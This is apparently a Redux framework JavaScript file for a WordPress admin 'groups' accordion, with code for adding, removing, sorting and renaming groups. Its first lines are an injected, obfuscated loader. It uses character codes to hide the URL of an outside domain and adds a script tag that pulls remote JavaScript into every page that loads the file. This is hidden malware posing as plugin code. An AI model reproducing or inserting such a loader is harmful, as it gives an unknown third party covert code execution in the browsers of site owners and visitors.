var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/* global redux_change */
(function($){
    "use strict";

    $.redux.group = $.group || {};
	
    $(document).ready(function () {
        //Group functionality
        $.redux.group();
    });
    
    $.redux.group = function(){
        $("#redux-groups-accordion")
        .accordion({
            header: "> div > h3",
            collapsible: true,
            active: false,
            heightStyle: "content",
            icons: {
                "header": "ui-icon-plus",
                "activeHeader": "ui-icon-minus"
            }
        })
        .sortable({
            axis: "y",
            handle: "h3",
            stop: function (event, ui) {
                // IE doesn't register the blur when sorting
                // so trigger focusout handlers to remove .ui-state-focus
                ui.item.children("h3").triggerHandler("focusout");
                var inputs = $('input.slide-sort');
                inputs.each(function(idx) {
                    $(this).val(idx);
                });
            }
        });
        
        $('.redux-groups-accordion-group input[data-title="true"]').on('keyup',function(event) {
            $(this).closest('.redux-groups-accordion-group').find('.redux-groups-header').text(event.target.value);
            $(this).closest('.redux-groups-accordion-group').find('.slide-title').val(event.target.value);
        });

        $('.redux-groups-remove').live('click', function () {
            redux_change($(this));
            $(this).parent().find('input[type="text"]').val('');
            $(this).parent().find('input[type="hidden"]').val('');
            $(this).parent().parent().slideUp('medium', function () {
                $(this).remove();
            });
        });

        $('.redux-groups-add').click(function () {

            var newSlide = $(this).prev().find('.redux-dummy').clone(true).show();
            var slideCounter = $(this).parent().find('.redux-dummy-slide-count');
            // Count # of slides
            var slideCount = slideCounter.val();
            // Update the slideCounter
            slideCounter.val(parseInt(slideCount)+1 );
            // REMOVE var slideCount1 = slideCount*1 + 1;

            //$(newSlide).find('h3').text('').append('<span class="redux-groups-header">New Group</span><span class="ui-accordion-header-icon ui-icon ui-icon-plus"></span>');
            $(this).prev().append(newSlide);

            // Remove dummy classes from newSlide
            $(newSlide).removeClass("redux-dummy");

            $(newSlide).find('input[type="text"], input[type="hidden"], textarea , select').each(function(){
                var attr_name = $(this).data('name');
                var attr_id = $(this).attr('id');
                // For some browsers, `attr` is undefined; for others,
                // `attr` is false.  Check for both.
                if (typeof attr_id !== 'undefined' && attr_id !== false) {
                    $(this).attr("id", $(this).attr("id").replace("@", slideCount) );
                }
                if (typeof attr_name !== 'undefined' && attr_name !== false) {
                    $(this).attr("name", $(this).data("name").replace("@", slideCount) );
                }

                if($(this).prop("tagName") == 'SELECT') {
                    //we clean select2 first
                    $(newSlide).find('.select2-container').remove();
                    $(newSlide).find('select').removeClass('select2-offscreen');
                }

                $(this).val('');
                if ($(this).hasClass('slide-sort')){
                    $(this).val(slideCount);
                }
            });
        });
    };
})(jQuery);
